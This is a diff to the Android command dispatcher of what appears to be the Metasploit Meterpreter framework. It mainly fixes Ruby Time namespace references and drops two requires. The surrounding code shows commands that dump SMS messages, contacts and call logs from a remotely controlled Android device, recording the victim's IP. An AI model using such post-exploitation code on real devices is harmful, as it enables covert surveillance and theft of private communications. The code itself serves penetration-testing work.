@@ -1,8 +1,6 @@
 # -*- coding: binary -*-
 require 'rex/post/meterpreter'
 require 'rex/post/meterpreter/extensions/android/command_ids'
-require 'msf/core/auxiliary/report'
-require 'rex/google/geolocation'
 require 'date'
 
 module Rex
@@ -109,7 +107,7 @@ class Console::CommandDispatcher::Android
         header = "Captured #{opts[:type]} data"
 
         if result[:timestamp]
-          time = Time.at(result[:timestamp]).to_datetime
+          time = ::Time.at(result[:timestamp]).to_datetime
           header << " at #{time.strftime('%Y-%m-%d %H:%M:%S')}"
         end
 
@@ -190,7 +188,7 @@ class Console::CommandDispatcher::Android
   end
 
   def cmd_dump_sms(*args)
-    path = "sms_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
+    path = "sms_dump_#{::Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_sms_opts = Rex::Parser::Arguments.new(
       '-h' => [ false, 'Help Banner' ],
       '-o' => [ true, 'Output path for sms list']
@@ -220,7 +218,7 @@ class Console::CommandDispatcher::Android
         data << "[+] SMS messages dump\n"
         data << "=====================\n\n"
 
-        time = Time.new
+        time = ::Time.new
         data << "Date: #{time.inspect}\n"
         data << "OS: #{info['OS']}\n"
         data << "Remote IP: #{client.sock.peerhost}\n"
@@ -254,7 +252,7 @@ class Console::CommandDispatcher::Android
           data << "Type\t: #{type}\n"
 
           time = a['date'].to_i / 1000
-          time = Time.at(time)
+          time = ::Time.at(time)
 
           data << "Date\t: #{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
           data << "Address\t: #{a['address']}\n"
@@ -277,7 +275,7 @@ class Console::CommandDispatcher::Android
   end
 
   def cmd_dump_contacts(*args)
-    path   = "contacts_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}"
+    path   = "contacts_dump_#{::Time.new.strftime('%Y%m%d%H%M%S')}"
     format = :text
 
     dump_contacts_opts = Rex::Parser::Arguments.new(
@@ -326,7 +324,7 @@ class Console::CommandDispatcher::Android
           data << "[+] Contacts list dump\n"
           data << "======================\n\n"
 
-          time = Time.new
+          time = ::Time.new
           data << "Date: #{time.inspect}\n"
           data << "OS: #{info['OS']}\n"
           data << "Remote IP: #{client.sock.peerhost}\n"
@@ -423,7 +421,7 @@ class Console::CommandDispatcher::Android
   end
 
   def cmd_dump_calllog(*args)
-    path = "calllog_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
+    path = "calllog_dump_#{::Time.new.strftime('%Y%m%d%H%M%S')}.txt"
     dump_calllog_opts = Rex::Parser::Arguments.new(
       '-h' => [ false, 'Help Banner' ],
       '-o' => [ true, 'Output path for call log']
@@ -453,7 +451,7 @@ class Console::CommandDispatcher::Android
         data << "[+] Call log dump\n"
         data << "=================\n\n"
 
-        time = Time.new
+        time = ::Time.new
         data << "Date: #{time.inspect}\n"
         data << "OS: #{info['OS']}\n"
         data << "Remote IP: #{client.sock.peerhost}\n"
